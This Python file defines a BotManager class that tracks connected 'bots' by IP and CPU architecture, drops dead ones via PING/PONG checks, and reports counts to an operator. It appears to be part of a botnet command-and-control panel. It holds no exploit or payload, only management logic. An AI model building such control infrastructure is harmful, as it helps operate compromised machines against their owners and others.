import logging
import time

class BotManager:
    def __init__(self, bots_dict, bots_by_arch, locks):
        self.bots = bots_dict
        self.bots_by_arch = bots_by_arch
        self.locks = locks
    
    def register(self, client, address, arch):
        if arch not in self.bots_by_arch:
            arch = 'unknown'
        
        with self.locks['bots']:
            for bot_addr in self.bots.values():
                if bot_addr[0] == address[0]:
                    client.close()
                    return False
                    
            self.bots[client] = address
            self.bots_by_arch[arch].append((client, address))
        
        logging.info(f"Bot conectado: {address[0]} ({arch})")
        return True
    
    def remove(self, client):
        with self.locks['bots']:
            if client in self.bots:
                address = self.bots[client]
                arch_found = False
                
                for arch in self.bots_by_arch:
                    for i, (bot_client, bot_addr) in enumerate(self.bots_by_arch[arch]):
                        if bot_client == client:
                            self.bots_by_arch[arch].pop(i)
                            arch_found = True
                            break
                    if arch_found:
                        break

                self.bots.pop(client)
                logging.info(f"Bot desconectado: {address}")
                return True
        return False
    
    def ping_all(self, send_func, safe_recv_func):
        dead_bots = []
        with self.locks['bots']:
            bots_copy = list(self.bots.keys())
        
        for bot in bots_copy:
            try:
                bot.settimeout(5)
                send_func(bot, 'PING', False, False)
                data = safe_recv_func(bot, 1024)
                if not data or data.decode('utf-8', errors='ignore').strip() != 'PONG':
                    dead_bots.append(bot)
            except Exception:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            try:
                bot.close()
            except:
                pass
            self.remove(bot)
    
    def get_count(self):
        with self.locks['bots']:
            return len(self.bots)
    
    def list_architectures(self, client, send_func):
        from colorama import Fore
        
        with self.locks['bots']:
            bots_count = len(self.bots)
            if bots_count == 0:
                send_func(client, f'{Fore.LIGHTWHITE_EX}\nNo bots :C\n')
                return
                
            send_func(client, f'{Fore.WHITE}Connected bots: {Fore.GREEN}{bots_count}')
            send_func(client, f'\n{Fore.WHITE}Bots Architectures:')
            
            for arch, bot_list in self.bots_by_arch.items():
                if len(bot_list) > 0:
                    send_func(client, f"     {Fore.WHITE}{arch}: {Fore.GREEN}{len(bot_list)}")
                    
            send_func(client, '')

